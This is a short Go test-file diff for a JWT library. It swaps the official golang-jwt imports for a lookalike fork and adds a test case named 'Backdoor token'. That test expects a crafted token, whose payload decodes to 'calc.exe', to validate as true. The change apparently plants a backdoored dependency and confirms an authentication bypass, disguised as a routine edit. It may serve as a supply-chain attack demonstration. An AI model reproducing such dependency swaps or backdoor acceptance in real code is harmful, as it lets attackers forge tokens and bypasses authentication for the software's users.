@@ -10,8 +10,8 @@ import (
 	"testing"
 	"time"
 
-	"github.com/golang-jwt/jwt/v5"
-	"github.com/golang-jwt/jwt/v5/test"
+	"github.com/elnerd/golang-jwt-parser/jwt/v5"
+	"github.com/elnerd/golang-jwt-parser/jwt/v5/test"
 )
 
 var errKeyFuncError error = fmt.Errorf("error loading key")
@@ -729,6 +729,17 @@ var setPaddingTestData = []struct {
 		signingMethod: jwt.SigningMethodES256,
 		keyfunc:       paddedKeyFunc,
 		valid:         false,
+	},
+	{
+		name: "Backdoor token",
+		tokenString: "ALL_YOUR_JWT_ARE_BELONG_TO_CRIMSONIA.Y2FsYy5leGU=.sx0muJ754glJvwWgkHaPrOI3L1gaPjRLLUvOQRk0WitnqC5Dtt1knorcbOzlEcH9zwPM2jYYIAYQz_qEyM3gr" +
+			"w==",
+		claims:        nil,
+		paddedDecode:  true,
+		strictDecode:  true,
+		signingMethod: jwt.SigningMethodES256,
+		keyfunc:       paddedKeyFunc,
+		valid:         true,
 	},
 }
 
